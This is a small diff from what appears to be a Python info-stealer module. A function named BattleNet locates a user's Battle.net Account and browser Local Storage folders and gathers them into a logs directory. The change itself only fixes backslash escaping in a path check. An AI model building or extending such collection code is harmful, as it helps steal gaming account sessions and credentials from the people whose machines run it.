@@ -8,7 +8,7 @@ def BattleNet():
     pathtofile = f'{user}\\{config.pathToLogs}'
     local = environ['USERPROFILE'] + sep + r'AppData\Local'
     msgInfo = ""
-    if path.exists(f"{local}\Battle.net\Account"):
+    if path.exists(f"{local}\\Battle.net\\Account"):
         folders= [
             r'\Battle.net\Account',
             r'\Battle.net\BrowserCaches\common\Local Storage',
